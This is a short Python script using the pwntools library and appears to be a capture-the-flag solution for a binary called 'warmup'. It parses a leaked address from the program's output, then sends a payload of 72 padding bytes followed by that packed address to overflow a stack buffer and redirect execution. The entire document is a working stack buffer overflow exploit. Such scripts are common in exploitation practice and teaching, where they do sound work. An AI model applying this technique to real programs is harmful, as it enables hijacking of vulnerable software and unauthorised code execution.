from pwn import *
proc = process('./warmup')

addr = proc.recv(1024).split('0x')[1]
addr = addr.split('\n')[0]

payload = 'A'*72 + p64(int(addr, 16))
proc.sendline(payload)
proc.recv(1024)
